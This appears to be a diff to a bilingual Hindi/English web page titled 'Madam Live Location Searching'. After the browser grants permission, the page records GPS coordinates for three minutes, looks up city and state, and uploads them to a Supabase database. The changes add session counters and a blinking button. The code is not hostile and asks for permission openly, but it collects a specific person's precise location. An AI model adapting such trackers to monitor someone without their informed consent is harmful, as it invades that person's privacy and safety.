@@ -33,6 +33,22 @@ button {
 .start {
     background: #16a34a;
     color: white;
+    animation: greenBlink 1s infinite;
+}
+
+.start:disabled {
+    cursor: default;
+    opacity: 1;
+    animation: none;
+}
+
+@keyframes greenBlink {
+    0%, 100% {
+        opacity: 1;
+    }
+    50% {
+        opacity: 0.4;
+    }
 }
 
 #status {
@@ -53,8 +69,11 @@ button {
 <h2>📍 Madam Live Location Searching</h2>
 <h2>📍 मैडम की लाइव लोकेशन सर्चिंग</h2>
 
-<button class="start" id="startButton" onclick="startTracking()">
-▶ Start Location / लोकेशन सर्च करना शुरू करें
+<button
+    class="start"
+    id="startButton"
+    onclick="startTracking()">
+    ▶ Start Location / लोकेशन सर्च करना शुरू करें
 </button>
 
 <div id="status">
@@ -89,12 +108,13 @@ if (!deviceId) {
 
 
 /* ==========================================
-   GPS + AUTO STOP AFTER 3 MINUTES
+   GPS AND AUTO STOP
 ========================================== */
 
 let watchId = null;
 let autoStopTimeout = null;
 let sessionActive = false;
+let sessionNumber = 0;
 
 
 /* ==========================================
@@ -113,20 +133,24 @@ function startTracking() {
         return;
     }
 
+    const button = document.getElementById("startButton");
+
+    button.disabled = true;
+
     document.getElementById("status").innerHTML =
-        "📡 फोन से GPS अनुमति की प्रतीक्षा की जा रही है...";
+        "📡 GPS अनुमति और लोकेशन की प्रतीक्षा की जा रही है...";
 
     navigator.geolocation.getCurrentPosition(
 
         position => {
 
-            // अनुमति मिलने और GPS position मिलने के बाद ही शुरू करें
             if (sessionActive) return;
 
             sessionActive = true;
+            const thisSession = ++sessionNumber;
 
-            document.getElementById("startButton").disabled = true;
-            document.getElementById("startButton").style.opacity = "0.6";
+            // ट्रैकिंग शुरू होने पर ब्लिंक बंद
+            button.style.animation = "none";
 
             document.getElementById("status").innerHTML = `
                 📍 लोकेशन सर्चिंग शुरू हो गई है।
@@ -139,29 +163,38 @@ function startTracking() {
             saveLocation(
                 position.coords.latitude,
                 position.coords.longitude,
-                position.coords.accuracy
+                position.coords.accuracy,
+                thisSession
             );
 
-            // आगे की लोकेशन अपडेट प्राप्त करें
+            // GPS से आगे की लोकेशन अपडेट लें
             watchId = navigator.geolocation.watchPosition(
 
                 currentPosition => {
 
-                    if (!sessionActive) return;
+                    if (!sessionActive ||
+                        thisSession !== sessionNumber) return;
 
                     saveLocation(
                         currentPosition.coords.latitude,
                         currentPosition.coords.longitude,
-                        currentPosition.coords.accuracy
+                        currentPosition.coords.accuracy,
+                        thisSession
                     );
                 },
 
                 error => {
-                    if (!sessionActive) return;
 
-                    document.getElementById("status").innerHTML +=
-                        "<br><br>⚠️ GPS अपडेट में समस्या: " +
-                        error.message;
+                    if (!sessionActive ||
+                        thisSession !== sessionNumber) return;
+
+                    document.getElementById("status").innerHTML = `
+                        ⚠️ GPS अपडेट में समस्या आई।
+                        <br><br>
+                        ${error.message}
+                        <br><br>
+                        ट्रैकिंग निर्धारित समय पर अपने आप बंद होगी।
+                    `;
                 },
 
                 {
@@ -171,19 +204,25 @@ function startTracking() {
                 }
             );
 
-            // 3 मिनट बाद अपने आप बंद
+            // पहली लोकेशन मिलने के बाद 3 मिनट का समय शुरू
             autoStopTimeout = setTimeout(() => {
-                stopTracking();
+                stopTracking(thisSession);
             }, 3 * 60 * 1000);
 
         },
 
         error => {
 
-            document.getElementById("status").innerHTML =
-                "❌ GPS अनुमति नहीं मिली या लोकेशन प्राप्त नहीं हो सकी। " +
-                "कृपया फोन की Location चालू करके दोबारा कोशिश करें।";
+            button.disabled = false;
+            button.style.animation = "greenBlink 1s infinite";
 
+            document.getElementById("status").innerHTML = `
+                ❌ GPS लोकेशन प्राप्त नहीं हो सकी।
+                <br><br>
+                कृपया फोन की Location चालू करें और अनुमति दें।
+                <br><br>
+                फिर हरे बटन को दोबारा दबाएँ।
+            `;
         },
 
         {
@@ -199,16 +238,22 @@ function startTracking() {
    SAVE LOCATION TO SUPABASE
 ========================================== */
 
-async function saveLocation(latitude, longitude, accuracy) {
+async function saveLocation(
+    latitude,
+    longitude,
+    accuracy,
+    thisSession
+) {
 
-    if (!sessionActive) return;
+    if (!sessionActive ||
+        thisSession !== sessionNumber) return;
 
     try {
 
         let city = "";
         let state = "";
 
-        /* CITY / STATE */
+        // CITY / STATE
         try {
 
             const geoURL =
@@ -239,8 +284,9 @@ async function saveLocation(latitude, longitude, accuracy) {
             console.log("Reverse geocoding failed:", geoError);
         }
 
-        // ट्रैकिंग बंद हो चुकी हो तो नया रिकॉर्ड न भेजें
-        if (!sessionActive) return;
+        // ट्रैकिंग बंद होने पर नया रिकॉर्ड न भेजें
+        if (!sessionActive ||
+            thisSession !== sessionNumber) return;
 
         const response = await fetch(
             SUPABASE_URL + "/rest/v1/locations",
@@ -270,29 +316,31 @@ async function saveLocation(latitude, longitude, accuracy) {
             throw new Error(errorText);
         }
 
-        if (sessionActive) {
+        if (!sessionActive ||
+            thisSession !== sessionNumber) return;
 
-            document.getElementById("status").innerHTML = `
-                📍 लोकेशन सर्चिंग शुरू हो गई है।
-                <br><br>
-                कृपया इसे 3 मिनट तक चलने दें।
-                इसके बाद यह अपने आप बंद हो जाएगी।
-                <br><br>
-                ✅ लोकेशन सर्वर पर सेव हो गई।
-                <br>
-                🎯 Accuracy: ${accuracy.toFixed(1)} m
-                <br>
-                🏙️ City: ${city || "-"}
-                <br>
-                🗺️ State: ${state || "-"}
-            `;
-        }
+        document.getElementById("status").innerHTML = `
+            📍 लोकेशन सर्चिंग शुरू हो गई है।
+            <br><br>
+            कृपया इसे 3 मिनट तक चलने दें।
+            इसके बाद यह अपने आप बंद हो जाएगी।
+            <br><br>
+            ✅ लोकेशन सर्वर पर सेव हो गई।
+            <br>
+            🎯 Accuracy: ${accuracy.toFixed(1)} m
+            <br>
+            🏙️ City: ${city || "-"}
+            <br>
+            🗺️ State: ${state || "-"}
+        `;
 
     } catch (error) {
 
         console.error("Supabase Error:", error);
 
-        if (sessionActive) {
+        if (sessionActive &&
+            thisSession === sessionNumber) {
+
             document.getElementById("status").innerHTML += `
                 <br><br>
                 ⚠️ लोकेशन सर्वर पर सेव नहीं हो पाई।
@@ -303,12 +351,13 @@ async function saveLocation(latitude, longitude, accuracy) {
 
 
 /* ==========================================
-   AUTO STOP
+   AUTOMATIC STOP AFTER 3 MINUTES
 ========================================== */
 
-function stopTracking() {
+function stopTracking(thisSession) {
 
-    if (!sessionActive) return;
+    if (!sessionActive ||
+        thisSession !== sessionNumber) return;
 
     sessionActive = false;
 
@@ -326,11 +375,16 @@ function stopTracking() {
         ✅ 3 मिनट पूरे हो गए हैं।
         <br><br>
         लोकेशन सर्चिंग अपने आप बंद हो गई है।
+        <br><br>
+        पहले से सेव लोकेशन रिकॉर्ड सुरक्षित हैं।
     `;
 
-    // दोबारा शुरू करने की अनुमति
-    document.getElementById("startButton").disabled = false;
-    document.getElementById("startButton").style.opacity = "1";
+    const button = document.getElementById("startButton");
+
+    button.disabled = false;
+
+    // बंद होने के बाद हरा बटन फिर ब्लिंक करे
+    button.style.animation = "greenBlink 1s infinite";
 }
 
 </script>
